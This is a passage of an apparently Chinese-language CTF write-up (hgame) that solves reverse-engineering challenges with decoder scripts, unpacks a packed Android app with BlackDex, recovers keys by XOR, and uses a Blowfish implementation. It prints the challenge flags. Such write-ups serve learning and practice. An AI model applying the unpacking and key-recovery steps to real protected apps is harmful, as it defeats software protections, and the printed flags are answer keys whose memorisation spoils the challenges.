<span class="number">0x7679</span>, <span class="number">0x66</span>, <span class="number">0x2AE7</span>, <span class="number">0x66</span>, <span class="number">0x4D6A</span>, <span class="number">0x66</span>, <span class="number">0x5708</span>, <span class="number">0x66</span>, <span class="number">0x6610</span>, <span class="number">0x66</span>, <span class="number">0xA258</span>, <span class="number">0x66</span>, <span class="number">0xB80C</span>, <span class="number">0x66</span>, <span class="number">0xC885</span>, <span class="number">0x67</span>, <span class="number">0x710A</span>, <span class="number">0x67</span>, <span class="number">0x7CF4</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0x3F76</span>, <span class="number">0x68</span>, <span class="number">0x702B</span>, <span class="number">0x68</span>, <span class="number">0xA3EE</span>, <span class="number">0x68</span>, <span class="number">0xAD50</span>, <span class="number">0x68</span>, <span class="number">0xBAC7</span>, <span class="number">0x69</span>, <span class="number">0x4024</span>, <span class="number">0x69</span>, <span class="number">0x8A22</span>, <span class="number">0x69</span>, <span class="number">0xC055</span>, <span class="number">0x6A</span>, <span class="number">0x2B52</span>, <span class="number">0x6A</span>, <span class="number">0xC687</span>, <span class="number">0x6B</span>, <span class="number">0x5F00</span>, <span class="number">0x6B</span>, <span class="number">0xC417</span>, <span class="number">0x6C</span>, <span class="number">0x6182</span>, <span class="number">0x6D</span>, <span class="number">0x75DB</span>, <span class="number">0x6E</span>, <span class="number">0x3C61</span>, <span class="number">0x6E</span>, <span class="number">0x4996</span>, <span class="number">0x6E</span>, <span class="number">0x5DC1</span>,</span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x2D76</span>, <span class="number">0x6F</span>, <span class="number">0x7D17</span>, <span class="number">0x6F</span>, <span class="number">0xA91B</span>, <span class="number">0x70</span>, <span class="number">0x9AED</span>, <span class="number">0x72</span>, <span class="number">0x45D0</span>, <span class="number">0x72</span>, <span class="number">0x8467</span>, <span class="number">0x72</span>, <span class="number">0xAB5D</span>, <span class="number">0x73</span>, <span class="number">0x5083</span>, <span class="number">0x73</span>, <span class="number">0x6222</span>, <span class="number">0x73</span>, <span class="number">0x8D93</span>, <span class="number">0x73</span>, <span class="number">0x923A</span>, <span class="number">0x73</span>, <span class="number">0x971E</span>, <span class="number">0x73</span>, <span class="number">0xB4BA</span>, <span class="number">0x73</span>, <span class="number">0xC785</span>, <span class="number">0x74</span>, <span class="number">0x3558</span>, <span class="number">0x74</span>, <span class="number">0x86BD</span>, <span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x9738</span>, <span class="number">0x75</span>, <span class="number">0x3710</span>, <span class="number">0x75</span>, <span class="number">0x9779</span>, <span class="number">0x77</span>, <span class="number">0x2F3F</span>, <span class="number">0x77</span>, <span class="number">0x44DD</span>, <span class="number">0x7B</span>, <span class="number">0x78E1</span>, <span class="number">0x7D</span>, <span class="number">0x9F42</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index[]=&#123;<span class="number">40</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">85</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">80</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">63</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">65</span>,</span><br><span class="line">         <span class="number">59</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">34</span>, <span class="number">43</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">7</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">48</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">75</span>, <span class="number">30</span>, <span class="number">76</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">31</span>, <span class="number">77</span>, <span class="number">82</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">51</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">22</span>, <span class="number">78</span>, <span class="number">36</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">56</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">79</span>, <span class="number">37</span>,</span><br><span class="line">         <span class="number">46</span>, <span class="number">19</span>, <span class="number">10</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">89</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[index[i]*<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">t = [<span class="number">0x4e7d</span>, <span class="number">0x67bd</span>, <span class="number">0x7a48</span>, <span class="number">0x82a2</span>, <span class="number">0x933e</span>, <span class="number">0x9c18</span>, <span class="number">0x5aff</span>, <span class="number">0x6cd7</span>, <span class="number">0xa6ca</span>, <span class="number">0xbd79</span>, <span class="number">0xcebd</span>, <span class="number">0x324a</span>, <span class="number">0x3292</span>, <span class="number">0x3905</span>,</span><br><span class="line">     <span class="number">0x4291</span>, <span class="number">0x5ade</span>, <span class="number">0x6e9f</span>, <span class="number">0xa52a</span>, <span class="number">0xbe35</span>, <span class="number">0xcb63</span>, <span class="number">0x7f3b</span>, <span class="number">0x3914</span>, <span class="number">0xb2ad</span>, <span class="number">0x38da</span>, <span class="number">0x4e50</span>, <span class="number">0x6a02</span>, <span class="number">0xb10f</span>, <span class="number">0x78e5</span>,</span><br><span class="line">     <span class="number">0x7ef6</span>, <span class="number">0x89a3</span>, <span class="number">0x8ebd</span>, <span class="number">0x95e3</span>, <span class="number">0x73da</span>, <span class="number">0x538c</span>, <span class="number">0x633b</span>, <span class="number">0x9e9c</span>, <span class="number">0xb78b</span>, <span class="number">0xc866</span>, <span class="number">0x32ae</span>, <span class="number">0x7679</span>, <span class="number">0x2ae7</span>, <span class="number">0x4d6a</span>,</span><br><span class="line">     <span class="number">0x5708</span>, <span class="number">0x6610</span>, <span class="number">0xa258</span>, <span class="number">0xb80c</span>, <span class="number">0xc885</span>, <span class="number">0x710a</span>, <span class="number">0x7cf4</span>, <span class="number">0x3f76</span>, <span class="number">0x702b</span>, <span class="number">0xa3ee</span>, <span class="number">0xad50</span>, <span class="number">0xbac7</span>, <span class="number">0x4024</span>, <span class="number">0x8a22</span>,</span><br><span class="line">     <span class="number">0xc055</span>, <span class="number">0x2b52</span>, <span class="number">0xc687</span>, <span class="number">0x5f00</span>, <span class="number">0xc417</span>, <span class="number">0x6182</span>, <span class="number">0x75db</span>, <span class="number">0x3c61</span>, <span class="number">0x4996</span>, <span class="number">0x5dc1</span>, <span class="number">0x2d76</span>, <span class="number">0x7d17</span>, <span class="number">0xa91b</span>, <span class="number">0x9aed</span>,</span><br><span class="line">     <span class="number">0x45d0</span>, <span class="number">0x8467</span>, <span class="number">0xab5d</span>, <span class="number">0x5083</span>, <span class="number">0x6222</span>, <span class="number">0x8d93</span>, <span class="number">0x923a</span>, <span class="number">0x971e</span>, <span class="number">0xb4ba</span>, <span class="number">0xc785</span>, <span class="number">0x3558</span>, <span class="number">0x86bd</span>, <span class="number">0x9738</span>, <span class="number">0x3710</span>,</span><br><span class="line">     <span class="number">0x9779</span>, <span class="number">0x2f3f</span>, <span class="number">0x44dd</span>, <span class="number">0x78e1</span>, <span class="number">0x9f42</span>]</span><br><span class="line"></span><br><span class="line">t2 = <span class="built_in">sorted</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t2:</span><br><span class="line">    print(t.index(i), end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0x42</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x64</span>,</span><br><span class="line">        <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x69</span>, <span class="number">0x69</span>, <span class="number">0x6a</span>, <span class="number">0x6a</span>, <span class="number">0x6b</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x6e</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>, <span class="number">0x6f</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0x7d</span>]</span><br><span class="line">index = [<span class="number">40</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">85</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">80</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">63</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">65</span>,</span><br><span class="line">         <span class="number">59</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">34</span>, <span class="number">43</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">7</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">48</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">75</span>, <span class="number">30</span>, <span class="number">76</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">31</span>, <span class="number">77</span>, <span class="number">82</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">51</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">22</span>, <span class="number">78</span>, <span class="number">36</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">56</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">79</span>, <span class="number">37</span>,</span><br><span class="line">         <span class="number">46</span>, <span class="number">19</span>, <span class="number">10</span>, ]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    print(<span class="built_in">chr</span>(flag[index[i]]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="hardened"><a href="#hardened" class="headerlink" title="hardened"></a>hardened</h3><p>安卓逆向，但是用了梆梆加固，需要脱壳，这里我是使用了<a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a>这个github项目提供的软件来脱壳。</p><p>脱完壳后。在jeb里面分析代码。<br><img src="https://s2.loli.net/2022/02/23/Xr4OTImW21YCcdj.png"></p><p>enc.so的aesEncryption函数和bbbb函数<br><img src="https://s2.loli.net/2022/02/23/yrxGRaXDmijzsWf.png"><br>我们对basetable进行交叉引用，发现了这里datadiv_decode9820009342035880852，对key，iv，和base表都进行了处理。<br><img src="https://s2.loli.net/2022/02/23/OWYldcALkwKs1Uf.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=[  <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7F</span>, <span class="number">0x7E</span>, <span class="number">0x71</span>, <span class="number">0x70</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>,</span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x28</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x2C</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x62</span>, <span class="number">0x66</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(<span class="built_in">chr</span>(i^<span class="number">0x49</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">enc2=[  <span class="number">0x7A</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x6F</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x71</span>, <span class="number">0x7C</span>, <span class="number">0x6F</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x7F</span>,</span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x7F</span>, <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>,</span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x73</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc2:</span><br><span class="line">    print(<span class="built_in">chr</span>(i^<span class="number">0x30</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">enc3=[  <span class="number">0x06</span>, <span class="number">0x10</span>, <span class="number">0x0A</span>, <span class="number">0x20</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x20</span>, <span class="number">0x12</span>,</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc3:</span><br><span class="line">    print(<span class="built_in">chr</span>(i^<span class="number">0x7f</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># JUST_A_NORMAL_KEY_FOR_YOU_TO_DEC</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># you_find_me!!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://gchq.github.io/CyberChef/</span></span><br><span class="line"><span class="comment">#mXYxnHYp61u/5qksdDel6TgiKqcvUbBkX3xErlR4lO0aEAdU0acJY8PRSVXJxxsRR8Dq9MTJhkWLSbBvCG5gtm==</span></span><br><span class="line"><span class="comment">#hgame&#123;cONGraTUl4T|0N5!N0w_yoU_C4n_eN?Oy~thE~MUsIc&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fishman"><a href="#fishman" class="headerlink" title="fishman"></a>fishman</h3><p>看了很多文章，都没找到合适的，然后尝试运行，也报错，没考虑到python版本的问题，也没使用findcrypt插件去搜索算法，没认出是blowfish算法，后面就没管了。</p><p>看了wp，发现是blowfish后，网上找了个写好的代码，找到key跑一下就直接出了。<a href="https://www.cnblogs.com/iBinary/p/14883752.html">https://www.cnblogs.com/iBinary/p/14883752.html</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BlowFish.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BlowFishInit</span><span class="params">(BLOWFISH_CTX* blowCtx, <span class="keyword">unsigned</span> <span class="keyword">char</span> * key, <span class="keyword">unsigned</span> <span class="keyword">int</span> keylen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//设置传入的CTX中的SBOX值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> Row = <span class="number">0</span>; Row &lt; <span class="number">4</span>; Row++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> Col = <span class="number">0</span>; Col &lt; <span class="number">256</span>; Col++)</span><br><span class="line">        &#123;</span><br><span class="line">            blowCtx-&gt;sbox[Row][Col] = ORIG_S[Row][Col];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    设置pbox</span></span><br><span class="line"><span class="comment">    1.循环18轮</span></span><br><span class="line"><span class="comment">    2.每轮都设置ctx.pbox值与data ^</span></span><br><span class="line"><span class="comment">    3.data = *(DWORD*)key[0] key[1]..... </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> KeyIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; N + <span class="number">2</span>; index++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> data = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//填充data 将key的字符设置到data当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//通过移位设置每个字符</span></span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[KeyIndex];</span><br><span class="line">            KeyIndex++;</span><br><span class="line">            <span class="comment">//如果超出了key长度 那么key要从开始</span></span><br><span class="line">            <span class="keyword">if</span> (KeyIndex &gt;= keylen)</span><br><span class="line">                KeyIndex = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//否则不满足</span></span><br><span class="line">        blowCtx-&gt;pbox[index] = ORIG_P[index] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对一个64位0 进行加密。加密结果的输出设置到pbox[i]与pbox[i+1]中</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Data1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Data2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">        blowCtx-&gt;pbox[i] = Data1;</span><br><span class="line">        blowCtx-&gt;pbox[i+<span class="number">1</span>] = Data2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化Sbox</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">            blowCtx-&gt;sbox[i][j] = Data1;</span><br><span class="line">            blowCtx-&gt;sbox[i][j + <span class="number">1</span>] = Data2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span 